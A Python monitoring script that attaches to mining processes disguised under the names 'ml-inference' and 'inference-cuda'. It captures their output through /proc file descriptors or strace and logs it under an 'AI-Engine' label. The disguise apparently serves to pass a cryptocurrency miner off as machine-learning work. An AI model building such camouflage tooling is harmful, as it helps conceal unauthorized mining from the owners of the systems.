#!/usr/bin/env python3
"""
🔧 Real Process Output Monitor
Capture actual stdout/stderr from running mining processes using proc filesystem
"""

import subprocess
import psutil
import time
import sys
import os
import threading
import select
sys.path.append('.')

from mining_environment.scripts.logging_config import setup_logging

def capture_process_output(pid, process_name, logger):
    """
    Capture real output from running process using /proc/PID/fd/
    """
    try:
        # Try multiple methods to capture process output
        methods = [
            f"/proc/{pid}/fd/1",  # stdout
            f"/proc/{pid}/fd/2",  # stderr
        ]
        
        for fd_path in methods:
            if os.path.exists(fd_path):
                try:
                    # Use tail to follow the file descriptor
                    cmd = ['tail', '-f', fd_path]
                    logger.info(f"📊 Starting output capture for {process_name} PID {pid} using {fd_path}")
                    
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        universal_newlines=True,
                        bufsize=1
                    )
                    
                    # Read output with timeout
                    start_time = time.time()
                    line_count = 0
                    
                    while line_count < 20 and (time.time() - start_time) < 60:  # Max 20 lines or 60 seconds
                        try:
                            # Non-blocking read with select
                            ready, _, _ = select.select([process.stdout], [], [], 1.0)
                            if ready:
                                line = process.stdout.readline()
                                if line:
                                    line_count += 1
                                    runtime = time.time() - start_time
                                    # Log with AI Engine format
                                    logger.info(f"[{process_name}-AI-Engine][R:{runtime:.0f}s] {line.strip()}")
                                    
                                    # Look for specific patterns
                                    if "H/s" in line or "task progress" in line or "difficulty" in line:
                                        logger.info(f"[{process_name}-AI-Engine][R:{runtime:.0f}s] 🎯 MINING ACTIVITY: {line.strip()}")
                            else:
                                # No output available, continue
                                continue
                                
                        except Exception as read_err:
                            logger.error(f"❌ Read error for {process_name}: {read_err}")
                            break
                    
                    process.terminate()
                    logger.info(f"📊 Output capture completed for {process_name} - captured {line_count} lines")
                    return line_count
                    
                except Exception as method_err:
                    logger.warning(f"⚠️ Method {fd_path} failed: {method_err}")
                    continue
        
        # If direct fd access fails, try strace method
        logger.info(f"📊 Trying strace method for {process_name} PID {pid}")
        return capture_with_strace(pid, process_name, logger)
        
    except Exception as e:
        logger.error(f"❌ Failed to capture output for {process_name}: {e}")
        return 0

def capture_with_strace(pid, process_name, logger):
    """
    Use strace to capture write syscalls (alternative method)
    """
    try:
        # Use strace to trace write syscalls
        cmd = ['strace', '-e', 'write', '-p', str(pid)]
        logger.info(f"📊 Using strace to capture {process_name} PID {pid} output")
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        start_time = time.time()
        line_count = 0
        
        while line_count < 15 and (time.time() - start_time) < 45:  # Max 15 lines or 45 seconds
            try:
                ready, _, _ = select.select([process.stderr], [], [], 1.0)  # strace outputs to stderr
                if ready:
                    line = process.stderr.readline()
                    if line and 'write(' in line:
                        line_count += 1
                        runtime = time.time() - start_time
                        
                        # Parse strace output to extract actual data
                        if '"' in line:
                            # Extract content between quotes
                            parts = line.split('"')
                            if len(parts) >= 2:
                                content = parts[1]
                                logger.info(f"[{process_name}-AI-Engine][R:{runtime:.0f}s] TRACE: {content}")
                                
                                # Look for mining patterns
                                if any(pattern in content for pattern in ['H/s', 'difficulty', 'algorithm', 'height']):
                                    logger.info(f"[{process_name}-AI-Engine][R:{runtime:.0f}s] 🎯 MINING DATA: {content}")
                else:
                    continue
                    
            except Exception as strace_err:
                logger.error(f"❌ Strace read error: {strace_err}")
                break
        
        process.terminate()
        logger.info(f"📊 Strace capture completed for {process_name} - captured {line_count} lines")
        return line_count
        
    except Exception as e:
        logger.error(f"❌ Strace method failed: {e}")
        return 0

def monitor_real_output():
    """Monitor real output from existing mining processes"""
    
    # Setup loggers for CPU and GPU (using relative path)
    cpu_logger = setup_logging('cpu_miner_real', './mining_environment/logs/cpu_miner.log', 'INFO')
    gpu_logger = setup_logging('gpu_miner_real', './mining_environment/logs/gpu_miner.log', 'INFO')
    
    print("🔍 Starting real mining process output monitor...")
    cpu_logger.info("📊 Real output monitor started for CPU mining processes")
    gpu_logger.info("📊 Real output monitor started for GPU mining processes")
    
    try:
        # Find running mining processes
        cpu_processes = []
        gpu_processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if 'ml-inference' in proc.info['name']:
                    cpu_processes.append(proc.info['pid'])
                    cpu_logger.info(f"📊 Found CPU mining process: PID {proc.info['pid']}")
                elif 'inference-cuda' in proc.info['name']:
                    gpu_processes.append(proc.info['pid'])
                    gpu_logger.info(f"📊 Found GPU mining process: PID {proc.info['pid']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        print(f"Found {len(cpu_processes)} CPU processes: {cpu_processes}")
        print(f"Found {len(gpu_processes)} GPU processes: {gpu_processes}")
        
        # Start output capture threads
        threads = []
        
        # Capture CPU processes output
        for pid in cpu_processes[:2]:  # Limit to first 2 processes
            thread = threading.Thread(
                target=capture_process_output,
                args=(pid, "CPU", cpu_logger),
                daemon=True,
                name=f"CPUCapture-{pid}"
            )
            thread.start()
            threads.append(thread)
        
        # Capture GPU processes output  
        for pid in gpu_processes[:1]:  # Limit to first 1 process
            thread = threading.Thread(
                target=capture_process_output,
                args=(pid, "GPU", gpu_logger),
                daemon=True,
                name=f"GPUCapture-{pid}"
            )
            thread.start()
            threads.append(thread)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=90)  # Max 90 seconds per thread
        
        cpu_logger.info("📊 Real output monitoring completed for CPU")
        gpu_logger.info("📊 Real output monitoring completed for GPU")
        print("✅ Real output monitoring completed")
        
    except Exception as e:
        cpu_logger.error(f"❌ Real output monitor error: {e}")
        gpu_logger.error(f"❌ Real output monitor error: {e}")
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    monitor_real_output()